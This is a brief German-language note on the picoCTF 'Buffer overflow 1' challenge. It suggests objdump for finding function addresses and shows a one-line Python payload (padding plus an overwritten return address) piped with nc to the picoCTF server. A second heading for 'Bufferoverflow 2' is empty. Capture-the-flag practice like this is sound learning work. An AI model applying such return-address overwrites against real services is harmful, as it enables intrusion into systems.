# Bufferoverflow 1

objdump mach so addressen von programmen

```shell
objdump
```

mit dem python befehl kann man herausfinden wie man die flag bekommt

```shel
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\xf6\x91\x04\x08' + b'\n')" | nc saturn.picoctf.net 64232
```



# Bufferoverflow 2

